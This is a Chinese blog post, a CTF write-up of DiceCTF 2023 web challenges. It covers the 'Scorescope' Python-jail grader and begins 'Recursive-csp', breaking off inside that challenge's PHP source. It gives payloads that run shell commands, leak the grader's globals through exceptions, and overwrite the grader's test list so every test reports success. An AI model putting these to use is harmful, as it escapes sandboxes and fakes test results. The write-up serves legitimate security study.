<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>DiceCTF2023 Web - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="DiceCTF2023 Web - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/04/02/DiceCTF2023%20_%20Web/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-04-01T16:42:24.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>April</span>
            <span>2,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">DiceCTF2023 Web</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/CasEXhCQesP1Njb621EfEw">https://mp.weixin.qq.com/s/CasEXhCQesP1Njb621EfEw</a><br>官方英文WP：<br><a target="_blank" rel="noopener" href="https://brycec.me/posts/dicectf_2023_challenges">https://brycec.me/posts/dicectf_2023_challenges</a></p>
<h1 id="Scorescope"><a href="#Scorescope" class="headerlink" title="Scorescope"></a>Scorescope</h1><p>考点：pyjail<br>其实感觉就是一道pyjail题<br>题目给了一个tempaltes.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Return the sum of a and b.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        a (int): The first number to add.</span></span><br><span class="line"><span class="string">        b (int): The second number to add.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        int: The sum of a and b.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">######## YOUR CODE ########</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="comment">###########################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">longest</span>(<span class="params">words</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Return the longest word in a list of words.</span></span><br><span class="line"><span class="string">    When there are multiple words of the same length, return the first.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        words (list): A list of words.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        str: The longest word in the list.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">######## YOUR CODE ########</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="comment">###########################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">common</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Return the longest common subsequence of two strings.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        a (str): The first string.</span></span><br><span class="line"><span class="string">        b (str): The second string.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        str: The longest common subsequence of a and b.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">######## YOUR CODE ########</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="comment">###########################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">favorite</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Return your favorite number. Must be the same as my favorite number.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        int: Your favorite number.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">######## YOUR CODE ########</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="comment">###########################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factor</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Given an integer, find two integers whose product is n.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        n (int): The number to factor.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        Tuple[int, int]: Two satisfying integers.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">######## YOUR CODE ########</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="comment">###########################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">preimage</span>(<span class="params"><span class="built_in">hash</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Given a sha256 hash, find a preimage (bytes).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        hash (str): The sha256 hash of a string in hex.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        bytes: A preimage of the hash.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">######## YOUR CODE ########</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="comment">###########################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">magic</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Guess the random number I am thinking of.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        int: Your guess.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">######## YOUR CODE ########</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="comment">###########################</span></span><br></pre></td></tr></table></figure>
<p>也就是一个接口，我们随便实现一个接口，上传看看发送什么：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;whoami&quot;</span>).read()</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680278647748-02021909-cff1-48e4-b94f-ffaae477b863.png#averageHue=%23f9f9f9&clientId=ue2be7dbc-efcc-4&from=paste&height=982&id=u503aa596&name=image.png&originHeight=1227&originWidth=2573&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=89555&status=done&style=none&taskId=uf7c85825-4ccc-4eee-9f9c-f9c3ea66f58&title=&width=2058.4" alt="image.png"><br>看样子是不能导入os模块，那么准备一个正常的接口</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> a+b</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">longest</span>(<span class="params">words</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">common</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">favorite</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factor</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">preimage</span>(<span class="params"><span class="built_in">hash</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">magic</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680278799032-81a2ad49-7d25-4bf5-b502-53678c68a9ad.png#averageHue=%23fafafa&clientId=ue2be7dbc-efcc-4&from=paste&height=761&id=u9b646b3c&name=image.png&originHeight=951&originWidth=1044&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=47982&status=done&style=none&taskId=uf37ea084-0b00-4233-9b92-55792b61dc5&title=&width=835.2" alt="image.png"><br>成功了一部分，但是还是有一些失败了，并且注意结尾，有一个hidden<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680278823397-d5406140-7576-4de5-b083-0ad9475034f7.png#averageHue=%23fafafa&clientId=ue2be7dbc-efcc-4&from=paste&height=103&id=u6745d810&name=image.png&originHeight=129&originWidth=455&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=4321&status=done&style=none&taskId=u847a4557-3cb3-471f-83a5-7078b5fc259&title=&width=364" alt="image.png"><br>就算上面的我们满足了，但是我们不知道hidden到底要满足啥，所以无论如何都会报错，那么怎么办呢？这里用到一个jail的小tips就是利用报错带出__main__中的所有数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> __main__</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">raise</span> BaseException(<span class="built_in">vars</span>(__main__))</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;__name__&#x27;: &#x27;__main__&#x27;, </span><br><span class="line">    &#x27;__doc__&#x27;: None, </span><br><span class="line">    &#x27;__package__&#x27;: None, </span><br><span class="line">    &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x7f8252a78bd0&gt;, </span><br><span class="line">    &#x27;__spec__&#x27;: None, </span><br><span class="line">    &#x27;__annotations__&#x27;: &#123;&#125;, </span><br><span class="line">    &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, </span><br><span class="line">    &#x27;__file__&#x27;: &#x27;/app/run&#x27;, </span><br><span class="line">    &#x27;__cached__&#x27;: None, </span><br><span class="line">    &#x27;json&#x27;: &lt;module &#x27;json&#x27; from &#x27;/usr/local/lib/python3.11/json/__init__.py&#x27;&gt;, </span><br><span class="line">    &#x27;sys&#x27;: &lt;module &#x27;sys&#x27; (built-in)&gt;, </span><br><span class="line">    &#x27;TestCase&#x27;: &lt;class &#x27;unittest.case.TestCase&#x27;&gt;, </span><br><span class="line">    &#x27;TestLoader&#x27;: &lt;class &#x27;unittest.loader.TestLoader&#x27;&gt;, </span><br><span class="line">    &#x27;TextTestRunner&#x27;: &lt;class &#x27;unittest.runner.TextTestRunner&#x27;&gt;, </span><br><span class="line">    &#x27;SilentResult&#x27;: &lt;class &#x27;util.SilentResult&#x27;&gt;, </span><br><span class="line">    &#x27;SubmissionImporter&#x27;: &lt;class &#x27;util.SubmissionImporter&#x27;&gt;, </span><br><span class="line">    &#x27;suite&#x27;: &lt;unittest.suite.TestSuite tests=[&lt;unittest.suite.TestSuite tests=[&lt;unittest.suite.TestSuite tests=[None, </span><br><span class="line">        None, </span><br><span class="line">        &lt;test_1_add.TestAdd testMethod=test_add_positive&gt;]&gt;, </span><br><span class="line">        &lt;unittest.suite.TestSuite tests=[]&gt;]&gt;, </span><br><span class="line">        &lt;unittest.suite.TestSuite tests=[&lt;unittest.suite.TestSuite tests=[]&gt;, </span><br><span class="line">        &lt;unittest.suite.TestSuite tests=[&lt;test_2_longest.TestLongest testMethod=test_longest_empty&gt;, </span><br><span class="line">        &lt;test_2_longest.TestLongest testMethod=test_longest_multiple&gt;, </span><br><span class="line">        &lt;test_2_longest.TestLongest testMethod=test_longest_multiple_tie&gt;, </span><br><span class="line">        &lt;test_2_longest.TestLongest testMethod=test_longest_single&gt;]&gt;]&gt;, </span><br><span class="line">        &lt;unittest.suite.TestSuite tests=[&lt;unittest.suite.TestSuite tests=[]&gt;, </span><br><span class="line">        &lt;unittest.suite.TestSuite tests=[&lt;test_3_common.TestCommon testMethod=test_common_consecutive&gt;, </span><br><span class="line">        &lt;test_3_common.TestCommon testMethod=test_common_empty&gt;, </span><br><span class="line">        &lt;test_3_common.TestCommon testMethod=test_common_many&gt;, </span><br><span class="line">        &lt;test_3_common.TestCommon testMethod=test_common_nonconsecutive&gt;, </span><br><span class="line">        &lt;test_3_common.TestCommon testMethod=test_common_single&gt;]&gt;]&gt;, </span><br><span class="line">        &lt;unittest.suite.TestSuite tests=[&lt;unittest.suite.TestSuite tests=[]&gt;, </span><br><span class="line">        &lt;unittest.suite.TestSuite tests=[&lt;test_4_favorite.TestFavorite testMethod=test_favorite&gt;]&gt;]&gt;, </span><br><span class="line">        &lt;unittest.suite.TestSuite tests=[&lt;unittest.suite.TestSuite tests=[]&gt;, </span><br><span class="line">        &lt;unittest.suite.TestSuite tests=[&lt;test_5_factor.TestFactor testMethod=test_factor_bigger&gt;, </span><br><span class="line">        &lt;test_5_factor.TestFactor testMethod=test_factor_large&gt;, </span><br><span class="line">        &lt;test_5_factor.TestFactor testMethod=test_factor_small&gt;]&gt;]&gt;, </span><br><span class="line">        &lt;unittest.suite.TestSuite tests=[&lt;unittest.suite.TestSuite tests=[]&gt;, </span><br><span class="line">        &lt;unittest.suite.TestSuite tests=[&lt;test_6_preimage.TestPreimage testMethod=test_preimage_a&gt;, </span><br><span class="line">        &lt;test_6_preimage.TestPreimage testMethod=test_preimage_b&gt;]&gt;]&gt;, </span><br><span class="line">        &lt;unittest.suite.TestSuite tests=[&lt;unittest.suite.TestSuite tests=[]&gt;, </span><br><span class="line">        &lt;unittest.suite.TestSuite tests=[&lt;test_7_magic.TestMagic testMethod=test_magic_a&gt;, </span><br><span class="line">        &lt;test_7_magic.TestMagic testMethod=test_magic_b&gt;, </span><br><span class="line">        &lt;test_7_magic.TestMagic testMethod=test_magic_c&gt;]&gt;]&gt;, </span><br><span class="line">        &lt;unittest.suite.TestSuite tests=[&lt;unittest.suite.TestSuite tests=[&lt;test_8_hidden.TestHidden testMethod=test_hidden&gt;]&gt;]&gt;]&gt;, </span><br><span class="line">    &#x27;tests&#x27;: [</span><br><span class="line">        &#x27;test_hidden&#x27;, </span><br><span class="line">        &#x27;test_magic_a&#x27;, </span><br><span class="line">        &#x27;test_magic_b&#x27;, </span><br><span class="line">        &#x27;test_magic_c&#x27;, </span><br><span class="line">        &#x27;test_preimage_a&#x27;, </span><br><span class="line">        &#x27;test_preimage_b&#x27;, </span><br><span class="line">        &#x27;test_factor_bigger&#x27;, </span><br><span class="line">        &#x27;test_factor_large&#x27;, </span><br><span class="line">        &#x27;test_factor_small&#x27;, </span><br><span class="line">        &#x27;test_favorite&#x27;, </span><br><span class="line">        &#x27;test_common_consecutive&#x27;, </span><br><span class="line">        &#x27;test_common_empty&#x27;, </span><br><span class="line">        &#x27;test_common_many&#x27;, </span><br><span class="line">        &#x27;test_common_nonconsecutive&#x27;, </span><br><span class="line">        &#x27;test_common_single&#x27;, </span><br><span class="line">        &#x27;test_longest_empty&#x27;, </span><br><span class="line">        &#x27;test_longest_multiple&#x27;, </span><br><span class="line">        &#x27;test_longest_multiple_tie&#x27;, </span><br><span class="line">        &#x27;test_longest_single&#x27;, </span><br><span class="line">        &#x27;test_add_mixed&#x27;, </span><br><span class="line">        &#x27;test_add_negative&#x27;, </span><br><span class="line">        &#x27;test_add_positive&#x27;</span><br><span class="line">    ], </span><br><span class="line">    &#x27;stack&#x27;: [], </span><br><span class="line">    &#x27;current&#x27;: &lt;unittest.suite.TestSuite tests=[</span><br><span class="line">        None, </span><br><span class="line">        None, </span><br><span class="line">        &lt;test_1_add.TestAdd testMethod=test_add_positive&gt;</span><br><span class="line">    ]&gt;, </span><br><span class="line">    &#x27;test&#x27;: &lt;test_1_add.TestAdd testMethod=test_add_positive&gt;, </span><br><span class="line">    &#x27;submission&#x27;: &#x27;import __main__rnrndef add(a, b):rn    raise BaseException(vars(__main__))&#x27;, </span><br><span class="line">    &#x27;f&#x27;: &lt;_io.TextIOWrapper name=&#x27;/dev/null&#x27; mode=&#x27;w&#x27; encoding=&#x27;utf-8&#x27;&gt;, </span><br><span class="line">    &#x27;stdout&#x27;: &lt;_io.TextIOWrapper name=&#x27;&lt;stdout&gt;&#x27; mode=&#x27;w&#x27; encoding=&#x27;utf-8&#x27;&gt;, </span><br><span class="line">    &#x27;stderr&#x27;: &lt;_io.TextIOWrapper name=&#x27;&lt;stderr&gt;&#x27; mode=&#x27;w&#x27; encoding=&#x27;utf-8&#x27;&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到了好一些数据，并且看到了hidden是在tests数组里的，但是我们还是不知道要满足啥，那么切换个思维，既然满足不了，那能不能覆盖呢？答案显然是可以的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> __main__</span><br><span class="line">__main__.tests=[<span class="string">&#x27;test_add_mixed&#x27;</span>]*<span class="number">22</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">raise</span> a+b</span><br></pre></td></tr></table></figure>
<p>因为在一开始我们知道test_add_mixed是被我们满足了的，这里把tests数组里22个元素都改为add_mixed就都会成功！<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680279101014-b49d54f8-2344-475f-9e1b-064e78f560bf.png#averageHue=%23f9f9f9&clientId=ue2be7dbc-efcc-4&from=paste&height=1054&id=u134a83f8&name=image.png&originHeight=1317&originWidth=1369&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=84470&status=done&style=none&taskId=u1a87f766-99cf-4fc6-b50d-f510b3a520e&title=&width=1095.2" alt="image.png"><br>flag就出现了，挺有意思的</p>
<h1 id="Recursive-csp"><a href="#Recursive-csp" class="headerlink" title="Recursive-csp"></a>Recursive-csp</h1><p>考点：CSP绕过,crc32碰撞<br>这个实在没办法复现了，环境都无了，docker-compose也没给，云做题即可<br>可以通过?source拿到源码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;source&quot;</span>])) <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>) &amp;&amp; <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;world&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>]) &lt; <span class="number">128</span>) &#123;</span><br><span class="line">  <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nonce</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&quot;crc32b&quot;</span>, <span class="variable">$name</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Security-Policy: default-src &#x27;none&#x27;; script-src &#x27;nonce-<span class="subst">$nonce</span>&#x27; &#x27;unsafe-inline&#x27;; base-uri &#x27;none&#x27;;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;recursive-csp&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Hello, <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$name</span> <span class="meta">?&gt;</span>!&lt;/h1&gt;</span><br><span class="line">    &lt;h3&gt;Enter your 